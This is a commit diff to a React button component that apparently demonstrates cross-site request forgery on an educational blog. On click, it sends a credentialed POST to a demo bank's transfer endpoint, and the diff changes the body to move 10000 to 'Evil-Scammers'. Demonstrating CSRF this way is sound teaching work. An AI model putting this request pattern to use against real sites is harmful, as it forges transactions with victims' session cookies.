36d62708c78594756e4514f5b6ef78af216845b1
Victor Zhou <victorzhou@fb.com>
2020-04-19 01:57:28 -0700

    Fix CSRF button logic + add clicked state

--- src/components/CSRFPostButton/CSRFPostButton.js
+++ src/components/CSRFPostButton/CSRFPostButton.js
@@ -1,33 +1,37 @@
 // @flow
-import React, { useCallback } from 'react';
+import classNames from 'classnames/bind';
+import React, { useCallback, useState } from 'react';
 
 import styles from './CSRFPostButton.module.scss';
+
+const cx = classNames.bind(styles);
 
 // Props have to be lowercase and are strings b/c this component is used in markdown.
 type Props = $ReadOnly<{|
   children: string,
+  'post-click-children'?: string,
 |}>;
 
 export default function CSRFPostButton(props: Props) {
+  const [hasClicked, setHasClicked] = useState(false);
+
   const onClick = useCallback(() => {
     fetch('https://dsb.victorzhou.com/transfer', {
       credentials: 'include',
       method: 'post',
       mode: 'no-cors',
-      body: new URLSearchParams('amount=100&description=test'),
+      body: new URLSearchParams('amount=10000&description=Gotcha!&to=Evil-Scammers'),
     })
-      .then(response => response.json())
-      .then(updatedUser => {
-        // eslint-disable-next-line no-alert
-        alert(updatedUser);
+      .then(() => {
+        setHasClicked(true);
       })
       .catch(console.error);
   }, []);
 
   return (
     <div className={styles['wrapper']}>
-      <button className={styles['button']} onClick={onClick}>
-        {props.children}
+      <button className={cx({ button: true, clicked: hasClicked })} onClick={onClick}>
+        {hasClicked && props['post-click-children'] ? props['post-click-children'] : props.children}
       </button>
     </div>
   );
